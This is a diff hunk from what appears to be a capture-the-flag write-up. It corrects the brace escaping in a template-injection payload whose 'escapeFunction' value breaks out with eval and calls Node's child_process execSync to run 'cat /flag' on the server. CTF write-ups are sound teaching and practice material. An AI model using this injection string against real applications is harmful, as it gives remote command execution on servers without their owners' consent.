@@ -112,7 +112,7 @@ Our revised payload will thus look like this (unobfuscated).
 ```python
 {
     'client': True,
-    'escapeFunction': """1;eval(`throw "${{process.mainModule.require('child_process').execSync('cat /flag')}}"`)"""
+    'escapeFunction': """1;eval(`throw "${process.mainModule.require('child_process').execSync('cat /flag')}"`)"""
 }
 ```
 
